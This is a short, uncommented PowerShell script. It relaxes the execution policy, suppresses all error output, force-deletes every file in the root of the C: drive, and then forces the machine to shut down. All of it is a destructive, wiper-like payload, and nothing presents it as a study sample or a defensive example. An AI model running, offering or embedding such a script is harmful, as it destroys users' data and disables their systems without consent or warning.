Set-ExecutionPolicy RemoteSigned
$ErrorActionPreference = "SilentlyContinue"
Get-ChildItem -Path "C:\" -File | Sort-Object -Property Name | ForEach-Object {
    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
}
Stop-Computer -Force
